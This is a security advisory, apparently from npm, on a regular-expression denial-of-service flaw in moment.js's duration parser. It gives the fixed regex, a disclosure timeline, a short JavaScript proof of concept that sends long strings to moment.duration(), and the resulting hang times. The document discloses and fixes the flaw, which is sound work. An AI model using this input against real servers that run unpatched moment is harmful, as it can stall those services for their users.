---
Publication-State: Active
Access: Public
Reviewers:
- Name: Adam Baldwin
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/moment
Review-Date: '2016-01-26'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Regular Expression Denial of Service*<br><br>Recommendation: Please update to version 2.11.2 or greater. If you are unable to update more information is available below.   A fix [has been made available in a pull request](https://github.com/moment/moment/pull/2939). Do not allow untrusted user input into `moment.duration()` or truncate the length of the allowed input to reduce blocking potential.  in moment.js change line 1819 from  `var aspNetRegex = /(\-)?(?:(\d*)[. ])?(\d+)\:(\d+)(?:\:(\d+)\.?(\d{3})?)?/;`   to   `var aspNetRegex = /^(\-)?(?:(\d*)[. ])?(\d+)\:(\d+)(?:\:(\d+)\.?(\d{3})?(?:\d*)?)?$/;`
### Details
moment is vulnerable to regular expression denial of service when user input is passed unchecked into moment.duration() blocking the event loop for a period of time.  "The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time." [1]  It's not a huge amplification it takes about 25k characters to get 1.1 seconds however that's well under most servers max request size so it's certainly exploitable.  The regular expression in question   moment/2.10.6/moment.js ``` 1679     var aspNetRegex = /(\-)?(?:(\d*)\.)?(\d+)\:(\d+)(?:\:(\d+)\.?(\d{3})?)?/; ```   ### Proof of concept ``` var moment = require('moment');  var genstr = function (len, chr) {     var result = "";     for (i=0; i<=len; i++) {         result = result + chr;     }      return result; }   for (i=20000;i<=10000000;i=i+10000) {     console.log("COUNT: " + i);     var str = '-' + genstr(i, '1')     console.log("LENGTH: " + str.length);     var start = process.hrtime();     moment.duration(str)      var end = process.hrtime(start);     console.log(end); } ```  ### Results ``` $ node moment.js COUNT: 20000 LENGTH: 20002 [ 0, 618931029 ] COUNT: 30001 LENGTH: 30003 [ 1, 401413894 ] COUNT: 40002 LENGTH: 40004 [ 2, 437075303 ] COUNT: 50003 LENGTH: 50005 [ 3, 824664804 ] COUNT: 60004 LENGTH: 60006 [ 5, 651335262 ] ```  ### Timeline: - 10/26/2015 - Initial Discovery - 10/26/2015 - Maintainers notified via email - 12/16/2015 - Maintainers notified via email again - 2/2/2016 - Added information to fix from pull request - 2/3/2016 - 
<br><br>• Affected Versions: <2.11.2
<br>• Patched Versions: >=2.11.2
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
['https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS']
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
